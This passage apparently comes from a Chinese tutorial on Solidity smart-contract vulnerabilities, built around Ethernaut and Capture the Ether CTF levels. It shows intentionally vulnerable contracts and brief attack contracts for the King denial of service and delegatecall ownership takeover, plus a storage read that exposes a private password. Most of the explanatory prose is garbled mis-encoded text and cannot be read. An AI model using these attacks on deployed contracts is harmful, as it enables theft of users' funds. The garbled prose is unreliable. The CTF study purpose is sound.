owner;\n\n  constructor() public payable &#123;\n    owner = msg.sender;  \n    king = msg.sender;\n    prize = msg.value;\n  &#125;\n\n  receive() external payable &#123;\n    require(msg.value >= prize || msg.sender == owner);\n    king.transfer(msg.value);\n    king = msg.sender;\n    prize = msg.value;\n  &#125;\n\n  function _king() public view returns (address payable) &#123;\n    return king;\n  &#125;\n&#125;\n\nåŽŸç†ï¼štransferå‡½æ•°å¦‚æžœå¼‚å¸¸ä¼šè½¬è´¦å¤±è´¥ï¼ŒæŠ›å‡ºå¼‚å¸¸ã€‚å¹¶ä¸”æœ‰gasé™åˆ¶ï¼Œæœ€å¤§2300ï¼Œé¿å…äº†é‡å…¥æ¼æ´žã€‚\næ¼æ´žåˆ†æžï¼šé¢˜ç›®å°±æ˜¯è¦æ±‚æˆä¸ºkingï¼Œä½†æ˜¯é¢˜ç›®ä¼šè¿›è¡Œkingçš„é‡ç”³ï¼Œè€Œtransferå‡½æ•°ä¸åŒäºŽcallå’Œsendï¼Œcallå’Œsendå‡½æ•°æ‰§è¡ŒåŽä¼šè¿”å›žtrueæˆ–è€…falseï¼Œtransferå‡½æ•°æ‰§è¡Œå¤±è´¥åŽä¼šè¿›è¡Œå›žæ»š(revert)æ‰€ä»¥æˆ‘ä»¬å°†kingå˜æˆè‡ªå·±åŽæäº¤å®žä¾‹æ—¶è¦é˜»æ­¢å…³å¡å¯¹äºŽkingçš„é‡ç”³ï¼Œç®€å•æ¥è¯´å°±æ˜¯è®©å…³å¡è§¦å‘receiveå‡½æ•°æ—¶å¤±è´¥ã€‚ç›´æŽ¥ä½¿ç”¨revertè®©å…³å¡åœ¨æƒ³æ”»å‡»åˆçº¦è½¬è´¦æ—¶å¤±è´¥ä»¥ä¸Šä¸¤ç§æ–¹æ³•å¯ä»¥ä½¿æ¼æ´žåˆçº¦ä¸­çš„transferå‡½æ•°æ‰§è¡Œå¤±è´¥ä»Žè€Œè¿›è¡Œå›žæ»šå¯¼è‡´kingçš„é‡ç”³å¤±è´¥ã€‚\ncontract attack&#123;\n    address target =0xd4c14dEeE2d55e2F999FFaAdb8d11CC7c6f67909;\n    function attack() payable public &#123;\n        target.call&#123;value : 0.001 ether&#125;(\"\");\n    &#125;\n    fallback() external payable &#123;\n        revert();\n    &#125;\n&#125;\n\nç›¸åº”ä¾‹é¢˜ï¼š\nethernautâ€”â€”King\nhttps://ethernaut.openzeppelin.com/level/0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5\n2.æ•´æ•°æº¢å‡ºæ¼æ´žæº¢å‡ºæ¼æ´žåŽŸç†ï¼š\nåœ¨solidityä¸­æœ‰ä¸¤ç§æ•´æ•°çš„è¡¨è¾¾æ–¹å¼ï¼Œåˆ†åˆ«æ˜¯intå’Œuintï¼Œä»£è¡¨æœ‰ç¬¦å·å’Œæ— ç¬¦å·æ•´æ•°ï¼Œæ•´æ•°æº¢å‡ºæ¼æ´žå­˜åœ¨äºŽuintä¸­ï¼Œæ¯”å¦‚uint(0-1)å°±ç›¸å½“äºŽ2^256-1ï¼Œç³»é‚£ä¸ªä¸€ä¸ªå°æ•°å­—å˜æˆä¸€ä¸ªæžå¤§çš„æ•°ï¼Œåˆ†ä¸ºä¸Šæº¢å‡ºå’Œä¸‹æº¢å¤„ã€‚é€šå¸¸ä½¿msg.valueä¸Šæº¢å‡ºè®©äº¤æ˜“é‡‘é¢å˜å°ï¼Œä½¿ä½™é¢ä¸‹æº¢å¤„èŽ·å¾—æ›´å¤šä½™é¢ã€‚\nä¾‹ä¸€ï¼Œmsg.valueä¸Šæº¢å‡ºï¼š\npragma solidity ^0.4.21;\n\ncontract TokenSaleChallenge &#123;\n    mapping(address => uint256) public balanceOf;\n    uint256 constant PRICE_PER_TOKEN = 1 ether;\n\n    function TokenSaleChallenge(address _player) public payable &#123;\n        require(msg.value == 1 ether);\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance &lt; 1 ether;\n    &#125;\n\n    function buy(uint256 numTokens) public payable &#123;\n        require(msg.value == numTokens * PRICE_PER_TOKEN);\n\n        balanceOf[msg.sender] += numTokens;\n    &#125;\n\n    function sell(uint256 numTokens) public &#123;\n        require(balanceOf[msg.sender] >= numTokens);\n\n        balanceOf[msg.sender] -= numTokens;\n        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);\n    &#125;\n&#125;\n\nåˆ†æžï¼š\nbuyå‡½æ•°ä¸­require msg.value &#x3D;&#x3D; numTokens * PRICE_PER_TOKENï¼Œå…¶ä¸­PRICE_PER_TOKENå›ºå®šä¸º1 etherï¼Œè€ŒnumTokensã€‚\nrequireç›´æŽ¥è¿›è¡Œä¹˜æ³•ï¼Œæ²¡æœ‰æ£€æµ‹è®¡ç®—å€¼åŽå¾—åˆ°çš„æ•°å€¼ï¼Œåœ¨æ­¤å¤„å¯ä»¥æž„é€ æ•´æ•°æº¢å‡ºæ¼æ´žä»Žè€Œä½¿msg.valueå˜æˆä¸€ä¸ªè¶³å¤Ÿå°çš„æ•°å€¼ã€‚\nä¾‹äºŒï¼Œä½™é¢ä¸‹æº¢å¤„\npragma solidity ^0.6.0;\n\ncontract Token &#123;\n\n  mapping(address => uint) balances;\n  uint public totalSupply;\n\n  constructor(uint _initialSupply) public &#123;\n    balances[msg.sender] = totalSupply = _initialSupply;\n  &#125;\n\n  function transfer(address _to, uint _value) public returns (bool) &#123;\n    require(balances[msg.sender] - _value >= 0);\n    balances[msg.sender] -= _value;\n    balances[_to] += _value;\n    return true;\n  &#125;\n\n  function balanceOf(address _owner) public view returns (uint balance) &#123;\n    return balances[_owner];\n  &#125;\n&#125;\n\nåˆ†æžï¼šä¸€é“éžå¸¸ç®€å•çš„é¢˜ç›®ï¼Œçœ‹ä¼¼é€»è¾‘æ¯”è¾ƒä¸¥è°¨ï¼Œä½†æ˜¯æ³¨æ„ require(balances[msg.sender] - _value &gt;&#x3D; 0)ä¸€è¡Œï¼Œè¦çŸ¥é“ï¼Œuintç±»åž‹ä¸­0-1æ˜¯å¤§äºŽä¸”è¿œè¿œå¤§äºŽ0çš„ï¼Œæ­¤å¤„å­˜åœ¨æº¢å‡ºæ¼æ´žï¼Œå¹¶ä¸”valueå¯æŽ§ï¼Œç›´æŽ¥è®¡ç®—valueä½¿ä½™é¢ä¸‹æº¢ã€‚\nç›¸åº”ä¾‹é¢˜ï¼š\ncapture the etherâ€”â€”Token sale\nhttps://capturetheether.com/challenges/math/token-sale/\nethernautâ€”â€”Token\nhttps://ethernaut.openzeppelin.com/level/0x63bE8347A617476CA461649897238A31835a32CE\n3.éšæœºæ•°æ¼æ´žåŽŸç†ï¼š\nåˆçº¦ä½¿ç”¨å¤–ç•ŒæœªçŸ¥çš„ç§æœ‰å˜é‡å‚ä¸Žéšæœºæ•°ç”Ÿæˆã€‚è™½ç„¶å˜é‡æ˜¯ç§æœ‰çš„ï¼Œæ— æ³•é€šè¿‡å¦ä¸€åˆçº¦è®¿é—®ï¼Œä½†æ˜¯å˜é‡å‚¨å­˜è¿› storage ä¹‹åŽä»ç„¶æ˜¯å…¬å¼€çš„ã€‚\næˆ–è€…ä½¿ç”¨ï¼Œhashï¼Œcoinbaseã€timestampã€numberã€difficultyã€gaslimitç­‰ç±»åž‹å€¼ä½œä¸ºéšæœºæ•°çš„ï¼Œä¹Ÿå­˜åœ¨å®‰å…¨é—®é¢˜ï¼Œå› ä¸ºè¿™äº›å˜é‡éƒ½æ˜¯å·²çŸ¥æˆ–è€…å¯æ“æŽ§çš„ï¼Œæ¯”å¦‚åœ¨åŒæ„ç¬”äº¤æ˜“ä¸­ï¼Œblockhashï¼Œblocnumberç­‰å‡æ˜¯ç›¸åŒçš„ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯blockhashåªèƒ½è¯»å–æœ€è¿‘çš„256ä¸ªåŒºå—ï¼Œåœ¨ä¹‹å‰çš„å°†ç›´æŽ¥è¿”å›ž0ã€‚\nä¾‹ä¸€ï¼Œå˜é‡ç»è¿‡å­˜å‚¨ä¹‹åŽå¯æŸ¥è¯¢\npragma solidity ^0.4.18;\n\ncontract Vault &#123;\n  bool public locked;\n  bytes32 private password;\n\n  function Vault(bytes32 _password) public &#123;\n    locked = true;\n    password = _password;\n  &#125;\n\n  function unlock(bytes32 _password) public &#123;\n    if (password == _password) &#123;\n      locked = false;\n    &#125;\n  &#125;\n&#125;\n\nåˆ†æžï¼špasswordç›´æŽ¥å­˜å‚¨åœ¨slot1ï¼Œè€Œåœ¨åŒºå—é“¾ä¸­ï¼Œæ•°æ®å¯ä»¥ç›´æŽ¥æŸ¥è¯¢ï¼Œåˆ©ç”¨å¦‚ä¸‹ä»£ç å³å¯èŽ·å¾—password\nprint(web3.eth.getStorageAt(contractaddress,1))\n\nç›¸åº”ä¾‹é¢˜ï¼š\nethernautâ€”â€”Vaultï¼šhttps://ethernaut.openzeppelin.com/level/0xf94b476063B6379A3c8b6C836efB8B3e10eDe188\nä¾‹äºŒï¼Œä½¿ç”¨åŒºå—é“¾å˜é‡\npragma solidity ^0.4.21;\n\ncontract GuessTheNewNumberChallenge &#123;\n    function GuessTheNewNumberChallenge() public payable &#123;\n        require(msg.value == 1 ether);\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance == 0;\n    &#125;\n\n    function guess(uint8 n) public payable &#123;\n        require(msg.value == 1 ether);\n        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));\n\n        if (n == answer) &#123;\n            msg.sender.transfer(2 ether);\n        &#125;\n    &#125;\n&#125;\n\nåˆ†æžï¼šä½¿ç”¨äº†åŒºå—é“¾å˜é‡çš„ä¼ªéšæœºæ•°ï¼ŒåŒä¸€ç¬”äº¤æ˜“ä¸­block.blockhash(block.number)å’Œnowå‡ç›¸åŒï¼Œç›´æŽ¥å†è°ƒç”¨æ—¶è®©n&#x3D;&#x3D;uint8(keccak256(block.blockhash(block.number - 1), now))å°±å¯ä»¥äº†\nç›¸åº”ä¾‹é¢˜ï¼š\ncapture the etherâ€”â€”Guess the new numberï¼šhttps://capturetheether.com/challenges/lotteries/guess-the-new-number/\nä¾‹ä¸‰ï¼Œå…³äºŽblockhashåªèƒ½è¯»å–æœ€è¿‘256åŒºå—\npragma solidity ^0.4.21;\n\ncontract PredictTheBlockHashChallenge &#123;\n    address guesser;\n    bytes32 guess;\n    uint256 settlementBlockNumber;\n\n    function PredictTheBlockHashChallenge() public payable &#123;\n        require(msg.value == 1 ether);\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance == 0;\n    &#125;\n\n    function lockInGuess(bytes32 hash) public payable &#123;\n        require(guesser == 0);\n        require(msg.value == 1 ether);\n\n        guesser = msg.sender;\n        guess = hash;\n        settlementBlockNumber = block.number + 1;\n    &#125;\n\n    function settle() public &#123;\n        require(msg.sender == guesser);\n        require(block.number > settlementBlockNumber);\n\n        bytes32 answer = block.blockhash(settlementBlockNumber);\n\n        guesser = 0;\n        if (guess == answer) &#123;\n            msg.sender.transfer(2 ether);\n        &#125;\n    &#125;\n&#125;\n\nåˆ†æžï¼šblock.blockhashè¿™ä¸ªå‡½æ•°ï¼Œå®ƒå¯ä»¥èŽ·å–ç»™å®šçš„åŒºå—å·çš„hashå€¼ï¼Œä½†åªæ”¯æŒæœ€è¿‘çš„256ä¸ªåŒºå—ï¼Œä¸åŒ…å«å½“å‰åŒºå—ï¼Œå¯¹äºŽ256ä¸ªåŒºå—ä¹‹å‰çš„å‡½æ•°å°†è¿”å›ž0ï¼Œæ‰€ä»¥åº”è¯¥æå‰è®¾ç½®guessä¸º0ï¼Œå†ç­‰å¾…255+1ä¸ªåŒºå—ã€‚\nç›¸åº”ä¾‹é¢˜ï¼š\ncapture the etherâ€”â€”Predict the block hashï¼šhttps://capturetheether.com/challenges/lotteries/predict-the-block-hash/\n4.çŸ­åœ°å€æ¼æ´žæ­£å¸¸ç”¨æˆ·ä»Žäº¤æ˜“æ‰€å–æ¬¾æˆ–è€…è½¬è´¦æ—¶ï¼Œå…ˆè¾“å…¥æ­£ç¡®çš„åœ°å€ï¼Œåœ¨è¾“å…¥å°äºŽæˆ–ç­‰äºŽè‡ªå·±å­˜å‚¨çš„ä»¥å¤ªå¸çš„æ•°é‡ï¼Œç„¶åŽå®Œæˆå­˜å–æ¬¾ã€‚\nåœ¨è°ƒç”¨å‡½æ•°æ—¶çš„inputåˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼ŒæŽ¥ä¸‹æ¥ä»¥erc20çš„transferä¸ºä¾‹ï¼š\npart 1ï¼š 4å­—èŠ‚ï¼Œæ–¹æ³•åçš„hashå€¼ï¼Œå³transfer.selectorã€‚\npart 2ï¼š32å­—èŠ‚ï¼Œå­˜å‚¨ä»¥å¤ªåŠçš„åœ°å€ï¼Œå³20å­—èŠ‚çš„addressï¼Œæœªæ»¡è¶³32å­—èŠ‚ï¼Œé«˜ä½è¡¥0.\npart 3ï¼š32å­—èŠ‚ï¼Œéœ€è¦ä¼ è¾“çš„ä»£å¸æ•°é‡ï¼Œæœªæ»¡è¶³32å­—èŠ‚åˆ™é«˜ä½è¡¥0.\nä¸Šè¿°ä¸‰éƒ¨åˆ†æŽ¥åˆèµ·æ¥å°±æ˜¯äº¤æ˜“æ•°æ®ã€‚\nåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå¦‚æžœäº¤æ˜“æ‰€æˆ–è€…é’±åŒ…æ–¹æ²¡æœ‰æ ¡éªŒç”¨æˆ·è¾“å…¥çš„åœ°å€é•¿åº¦æ˜¯å¦åˆæ³•ï¼Œå°±å­˜åœ¨çŸ­åœ°å€æ¼æ´žã€‚\nå‡è®¾çŽ°åœ¨æœ‰åˆæ³•åœ°å€0x1234567890123456789012345678901234567800ã€‚\næ³¨æ„æœ«å°¾çš„00ï¼Œé—®é¢˜å°±å¤„åœ¨åœ°å€æœ«å°¾å¤„çš„00ï¼Œå½“æˆ‘ä»¬å°†åŽé¢çš„00çœç•¥ï¼Œç„¶åŽå°†å‚æ•°ä¼ é€’ç»™æ™ºèƒ½åˆçº¦æ—¶ï¼Œå‚æ•°å°†æ ¹æ®ABIè§„èŒƒè¿›è¡Œç¼–ç ã€‚åœ¨00çœç•¥çš„æƒ…å†µä¸‹æˆ‘ä»¬å‘é€çš„å°±æ˜¯19å­—èŠ‚(38ä½åœ°å€)è€Œä¸æ˜¯20å­—èŠ‚çš„æ ‡å‡†åœ°å€ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒEVMä¼šè‡ªåŠ¨ä»Žä¸‹ä¸€ä¸ªå‚æ•°çš„æœ€é«˜ä½æ‹¿åˆ°1ä¸ªå­—èŠ‚(2ä¸ªåå…­è¿›åˆ¶ä½)æ¥è¡¥å……ä»¥è¾¾åˆ°é¢„æœŸé•¿åº¦ï¼Œè¿™å°±å¯¼è‡´äº†æ®µåœ°å€æ¼æ´žã€‚\næ¯”å¦‚åœ¨å¦‚ä¸‹æµ‹è¯•ä»£ç ä¸­\npragma solidity ^0.4.11\ncontract shortaddr &#123;\n    mapping(address=>uint)balanceOf;\n    constructor() public&#123;\n        balanceOf[msg.sender]=1000;\n    &#125;\n    function transfer(address to,uint amount) public&#123;\n        require(balanceOf[msg.sender]>=amount);\n        balanceOf[msg.sender]-=amount;\n        balanceOf[to]+=amount;\n    &#125;\n    function getbalance(address addr)view returns(uint)&#123;\n        return balanceOf[addr];\n    &#125;\n&#125;\n\nè°ƒç”¨transferå‡½æ•°å¹¶ä¸”ä½¿ç”¨ä¸Šè¿°çŸ­åœ°å€ï¼Œè½¬è´¦5ä¸ªtokenï¼Œamountå‚æ•°æœ€é«˜ä½çš„00å°†ä¼šè¢«åžæŽ‰ï¼ŒåŽŸæœ¬çš„è½¬è´¦5tokenå°†ä¼šå˜æˆè½¬è´¦0x500ä¸ªtokenå³900ä¸ªï¼Œæ‰€ä»¥æœ‰è¾ƒå¤§é£Žé™©ã€‚\nä¸è¿‡è¯¥æ¼æ´žå‡ ä¹Žå·²ç»è¢«ä¿®å¤ï¼Œè¿˜æ²¡æœ‰é‡åˆ°è¿‡ç›¸åº”çš„ä¾‹é¢˜ã€‚\nä¸èƒ½é€šè¿‡ Remix å¤çŽ°ï¼Œå› ä¸ºå®¢æˆ·ç«¯ä¼šæ£€æŸ¥åœ°å€é•¿åº¦ï¼›ä¹Ÿä¸èƒ½é€šè¿‡ sendTransaction()ï¼Œå› ä¸º web3 ä¸­ä¹ŸåŠ äº†ä¿æŠ¤ã€‚\nä½†æ˜¯ï¼Œå¯ä»¥ä½¿ç”¨ geth æ­å»ºç§é“¾ï¼Œä½¿ç”¨ sendRawTransaction() å‘é€äº¤æ˜“å¤çŽ°ï¼Œå¯è¿›è¡Œå¤çŽ°ã€‚\n5.callè°ƒç”¨æ¼æ´žcallè°ƒç”¨åˆ†ä¸ºcallï¼Œcallcodeä»¥åŠdelegatecal åŽŸç†ï¼š\nå…ˆåˆ†åˆ«ç†è§£ä¸€ä¸‹ä¸‰ç§callè°ƒç”¨çš„å¼‚åŒ\n\ncall: æœ€å¸¸ç”¨çš„è°ƒç”¨æ–¹å¼ï¼Œè°ƒç”¨åŽå†…ç½®å˜é‡ msg çš„å€¼ä¼šä¿®æ”¹ä¸ºè°ƒç”¨è€…ï¼Œæ‰§è¡ŒçŽ¯å¢ƒä¸ºè¢«è°ƒç”¨è€…çš„è¿è¡ŒçŽ¯å¢ƒ(åˆçº¦çš„ storage)ã€‚\ndelegatecall: è°ƒç”¨åŽå†…ç½®å˜é‡ msg çš„å€¼ä¸ä¼šä¿®æ”¹ä¸ºè°ƒç”¨è€…ï¼Œä½†æ‰§è¡ŒçŽ¯å¢ƒä¸ºè°ƒç”¨è€…çš„è¿è¡ŒçŽ¯å¢ƒã€‚\ncallcode: è°ƒç”¨åŽå†…ç½®å˜é‡ msg çš„å€¼ä¼šä¿®æ”¹ä¸ºè°ƒç”¨è€…ï¼Œä½†æ‰§è¡ŒçŽ¯å¢ƒä¸ºè°ƒç”¨è€…çš„è¿è¡ŒçŽ¯å¢ƒã€‚\n\n\næƒ…å†µä¸€ï¼šcall\n\nAåˆçº¦ï¼š\ntemp1 &#x3D; 0\ntemp2 &#x3D; 0\nBåˆçº¦ï¼š\ntemp1 &#x3D; Aåˆçº¦åœ°å€\ntemp2 &#x3D; 100\nè¯´æ˜Žï¼šcallè°ƒç”¨åŽå†…ç½®å˜é‡ msg çš„å€¼ä¼šä¿®æ”¹ä¸ºè°ƒç”¨è€…ï¼ˆAåˆçº¦åœ°å€ï¼‰ï¼Œæ‰§è¡ŒçŽ¯å¢ƒä¸ºè¢«è°ƒç”¨è€…ï¼ˆBåˆçº¦ï¼‰çš„è¿è¡ŒçŽ¯å¢ƒ(è¿è¡ŒçŽ¯å¢ƒæŒ‡åˆçº¦çš„ storage)\næƒ…å†µäºŒï¼šdelegatecall\n\nAåˆçº¦ï¼š\ntemp1 &#x3D; è°ƒç”¨Aåˆçº¦çš„ä»¥å¤ªåŠè´¦å·åœ°å€\ntemp2 &#x3D; 100\nBåˆçº¦ï¼š\ntemp1 &#x3D; 0\ntemp2 &#x3D; 0\nè¯´æ˜Žï¼šdelegatecallè°ƒç”¨åŽå†…ç½®å˜é‡ msg çš„å€¼ä¸ä¼šä¿®æ”¹ä¸ºè°ƒç”¨è€…ï¼ˆAåˆçº¦åœ°å€ï¼‰ï¼Œä½†æ‰§è¡ŒçŽ¯å¢ƒä¸ºè°ƒç”¨è€…ï¼ˆAåˆçº¦ï¼‰çš„è¿è¡ŒçŽ¯å¢ƒ\næƒ…å†µä¸‰ï¼šcallcode\n\ncallcodeåœ¨solidity 0.5.0ä¹‹åŽå°±è¢«æ”¹å˜æˆäº†delegatecal\nAåˆçº¦ï¼š\ntemp1 &#x3D; Aåˆçº¦åœ°å€\ntemp2 &#x3D; 100\nBåˆçº¦ï¼š\ntemp1 &#x3D; 0\ntemp2 &#x3D; 0\nè¯´æ˜Žï¼šcallcodeè°ƒç”¨åŽå†…ç½®å˜é‡ msg çš„å€¼ä¼šä¿®æ”¹ä¸ºè°ƒç”¨è€…ï¼ˆAåˆçº¦åœ°å€ï¼‰ï¼Œä½†æ‰§è¡ŒçŽ¯å¢ƒä¸ºè°ƒç”¨è€…ï¼ˆAåˆçº¦ï¼‰çš„è¿è¡ŒçŽ¯å¢ƒã€‚\nä¾‹ï¼š\npragma solidity ^0.6.0;\n\ncontract Delegate &#123;\n\n  address public owner;\n\n  constructor(address _owner) public &#123;\n    owner = _owner;\n  &#125;\n\n  function pwn() public &#123;\n    owner = msg.sender;\n  &#125;\n&#125;\n\ncontract Delegation &#123;\n\n  address public owner;\n  Delegate delegate;\n\n  constructor(address _delegateAddress) public &#123;\n    delegate = Delegate(_delegateAddress);\n    owner = msg.sender;\n  &#125;\n\n  fallback() external &#123;\n    (bool result,) = address(delegate).delegatecall(msg.data);\n    if (result) &#123;\n      this;\n    &#125;\n  &#125;\n&#125;\n\nåˆ†æžï¼šä½¿ç”¨delegatecallï¼Œå°†ä¼šåœ¨è°ƒç”¨è€…çŽ¯å¢ƒä¸‹æ‰§è¡Œï¼Œdelegatecalå³å¯ä¿®æ”¹åˆçº¦ä¸­çš„owner\nattackï¼š\ncontract attack&#123;\n    address target =0xd2a5bC10698FD955D1Fe6cb468a17809A08fd005;\n    bytes4 public result;\n    function trandform()public&#123;\n    result=bytes4(keccak256(\"pwn()\"));\n&#125;\n    function pwn() public payable&#123;\n    target.call(abi.encodePacked(result,\"\"));\n&#125;\n&#125;\n\nç›¸åº”ä¾‹é¢˜\nethernautç¬¬å…­é¢˜â€”â€”delegation\nhttps://ethernaut.openzeppelin.com/level/0x9451961b7Aea1Df57bc20CC68D72f662241b5493\ncallè°ƒç”¨ï¼š\næˆ‘çŽ°åœ¨èƒ½æƒ³åˆ°çš„å…³äºŽcallè°ƒç”¨çš„æ¼æ´žå°±åªæœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯é‡å…¥\né‡å…¥åœ¨åŸºç¡€æ¼æ´žçš„ç¬¬ä¸€ç¯‡å°±å·²ç»è¯´è¿‡äº†\nå…³äºŽè½¬è´¦çš„æ¼æ´ž \nè¿˜æœ‰ä¸€ä¸ªå°±æ˜¯æƒé™ç»•è¿‡ï¼Œå‚è€ƒvnctfé‡Œè¾¹çš„vnloané‚£é“é¢˜å§ï¼Œä¹‹å‰å‘è¿‡åšå®¢ï¼Œè¿™é‡Œå°±ä¸åœ¨è¯´äº†\nVNCTF2022å…¬å¼€èµ› Blockchain-VNloan - è·³è·³ç³–\nè¿˜æœ‰å°±æ˜¯å…³äºŽcallcodeçš„ä¾‹é¢˜ï¼Œç›®å‰è¿˜æ²¡é‡åˆ°è¿‡ï¼Œç­‰é‡åˆ°äº†ï¼Œæˆ‘å†è¡¥åˆ°è¿™é‡Œ\n6.æœªåˆå§‹åŒ–çš„å­˜å‚¨æŒ‡é’ˆåŽŸç†ï¼šæœªåˆå§‹åŒ–çš„å­˜å‚¨æŒ‡é’ˆæ˜¯æŒ‡åœ¨ EVM ä¸­æœªè¿›è¡Œåˆå§‹åŒ–çš„ storage å˜é‡ï¼Œè¿™ä¸ªå˜é‡ä¼šæŒ‡å‘å…¶ä»–å˜é‡çš„åŒºåŸŸï¼Œä»Žè€Œæ›´æ”¹å…¶ä»–å˜é‡çš„å€¼ã€‚\nåœ¨solidityæ™ºèƒ½åˆçº¦è¯­è¨€ä¸­ï¼Œæœ‰storageå’Œmemoryä¸¤ç§å­˜å‚¨æ–¹å¼ã€‚storageå˜é‡æ˜¯æŒ‡æ°¸è¿œå­˜å‚¨åœ¨åŒºå—é“¾ä¸­çš„å˜é‡ï¼›memoryå˜é‡çš„å­˜å‚¨æ˜¯ä¸´æ—¶çš„ï¼Œè¿™äº›å˜é‡åœ¨å¤–éƒ¨è°ƒç”¨ç»“æŸåŽä¼šè¢«ç§»é™¤ã€‚ä½†æ˜¯solidityç›®å‰å¯¹å¤æ‚çš„æ•°æ®ç±»åž‹ï¼Œæ¯”å¦‚array(æ•°ç»„)å’Œstruct(ç»“æž„ä½“)ï¼Œåœ¨å‡½æ•°ä¸­ä½œä¸ºå±€éƒ¨å˜é‡æ—¶ï¼Œä¼šé»˜è®¤å­˜å‚¨åœ¨storaegä¸­ã€‚solidityå¯¹äºŽå˜é‡å­˜å‚¨ï¼Œéƒ½æ˜¯æŒ‰ç…§çŠ¶æ€åœ¨åˆçº¦ä¸­çš„å…ˆåŽé¡ºåºè¿›è¡Œä¾æ¬¡å­˜å‚¨çš„\nä¾‹ï¼š\nç»“æž„ä½“\npragma solidity 0.4.24;\ncontract cover&#123;\n    address public owner=msg.sender;\n    struct Name&#123;\n        address user;\n        mapping(address=>uint)balanceof;\n    &#125;\n    function regeist(address youraddress) public payable&#123;\n        Name name;\n        require(msg.value>0);\n        name.user=youraddress;\n        name.balanceof[youraddress]+=msg.value;\n    &#125;\n    function getbalance(address tar)public view returns(uint balance)&#123;\n        Name name;\n        return name.balanceof[tar];\n    &#125;\n&#125;\n\nåœ¨è¿›è¡Œæ³¨å†Œå¹¶å­˜æ¬¾æ—¶ï¼Œç”±äºŽè¯¥storageå˜é‡æœªåˆå§‹åŒ–ï¼Œæ‰€ä»¥å¯èƒ½ä¼šè¦†ç›–å…¶ä»–å˜é‡ï¼Œownerå°†ä¼šè¢«è¦†ç›–ä¸ºyouraddress\næ¯”å¦‚åˆçº¦éƒ¨ç½²åŽï¼Œownerä¸ºåˆçº¦éƒ¨ç½²è€…ï¼Œä½†æ˜¯åœ¨ç”¨æˆ·æ‹¿ç€è‡ªå·±çš„åœ°å€è¿›è¡Œæ³¨å†Œæ—¶ï¼Œownerå°±å˜æˆäº†user\néƒ¨ç½²åŽ\n\nregeiståŽ\n\nå¯è§ownerè¢«è¦†ç›–\nè¿™ä¸ªä¾‹å­çš„ä¿®å¤æ–¹æ¡ˆæ˜¯ä½¿ç”¨ mapping è¿›è¡Œç»“æž„ä½“çš„åˆå§‹åŒ–ï¼Œå¹¶ä½¿ç”¨ storage è¿›è¡Œæ‹·è´ï¼š\npragma solidity 0.4.24;\ncontract cover&#123;\n    address public owner=msg.sender;\n    struct Name&#123;\n        address user;\n        mapping(address=>uint)balanceof;\n    &#125;\n    mapping(uint=>Name)wallet;\n    function regeist(uint id,address youraddress) public payable&#123;\n        Name storage wallets=wallet[id];\n        require(msg.value>0);\n        wallets.user=youraddress;\n        wallets.balanceof[youraddress]+=msg.value;\n    &#125;\n    function getbalance(uint id,address tar)public view returns(uint balance)&#123;\n        Name storage wallets=wallet[id];\n        return wallets.balanceof[tar];\n    &#125;\n&#125;\n\n\néƒ¨ç½²åˆçº¦åŽownerä¸ä¼šæ”¹å˜\næ•°ç»„\nä»£ç æ¥æºäºŽctf wiki\npragma solidity ^0.4.24;\n\ncontract example2&#123;\n    uint public a;\n    uint[] b;\n\n    function setValue(uint _a) public &#123;\n        a = _a;\n    &#125;\n\n    function attack(uint _value) public &#123;\n        uint[] tmp;\n        tmp.push(_value);\n        b = tmp;\n    &#125;\n&#125;\n\n\néƒ¨ç½²åˆçº¦åŽè®¾ç½®aä¸º100ï¼Œåœ¨ç”¨ä»»æ„æ•°å­—è°ƒç”¨attackï¼Œåœ¨çœ‹aï¼Œå¯ä»¥å‘çŽ°aå˜æˆäº†101\n\nå¯è§åˆå§‹åŒ–æ—¶uint[] tmpå¯¼è‡´æ•°ç»„é•¿åº¦å˜æˆäº†açš„å€¼ï¼Œåœ¨è¿›è¡ŒpushåŽï¼Œå°†tempèµ‹å€¼ç»™bï¼Œæ­¤æ—¶è¦†ç›–äº†aä¸ºbçš„é•¿åº¦å³100+1&#x3D;101\nä¾‹é¢˜ï¼š\npragma solidity ^0.4.21;\n\ncontract DonationChallenge &#123;\n    struct Donation &#123;\n        uint256 timestamp;\n        uint256 etherAmount;\n    &#125;\n    Donation[] public donations;\n\n    address public owner;\n\n    function DonationChallenge() public payable &#123;\n        require(msg.value == 1 ether);\n        \n        owner = msg.sender;\n    &#125;\n    \n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance == 0;\n    &#125;\n\n    function donate(uint256 etherAmount) public payable &#123;\n        // amount is in ether, but msg.value is in wei\n        uint256 scale = 10**18 * 1 ether;\n        require(msg.value == etherAmount / scale);\n\n        Donation donation;\n        donation.timestamp = now;\n        donation.etherAmount = etherAmount;\n\n        donations.push(donation);\n    &#125;\n\n    function withdraw() public &#123;\n        require(msg.sender == owner);\n        \n        msg.sender.transfer(address(this).balance);\n    &#125;\n&#125;\n\nåˆ†æžï¼šæ‰§è¡Œdonateæ—¶Donationåˆå§‹åŒ–å¹¶ä¼ å…¥å¯¹åº”å‚æ•°ï¼Œæ²¡æœ‰å¼ºè°ƒmemoryï¼Œæ‰€ä»¥å ç”¨storageï¼Œå®žé™…ä¿®æ”¹å€¼ä¸ºslot0ä»¥åŠslot1ï¼Œæ‰€ä»¥å°†etherAmountä¸ºint(address(player),16)å³å¯ä¿®æ”¹ownerä¸ºplayerã€‚\ncapture the etherâ€”â€”Donation\nhttps://capturetheether.com/challenges/math/donation/\n7.æ•°ç»„é•¿åº¦æº¢å¤„åŽŸç†ï¼šæ•°ç»„æœ€å¤§çš„é•¿åº¦ä¸º2^256ï¼Œå¦‚æžœä¸åšä¿æŠ¤ï¼Œæ•°ç»„é•¿åº¦ä¸‹æº¢ï¼Œé€šè¿‡æ‰©å¤§æ•°ç»„åˆ°æ•´ä¸ª 2^256 çš„å­˜å‚¨åŒºåŸŸ. ç„¶åŽç”¨æˆ·å°±å¯ä»¥æ›´æ”¹æ‰€æœ‰åˆçº¦çš„storageäº†\nä¾‹ï¼š\n// SPDX-License-Identifier: 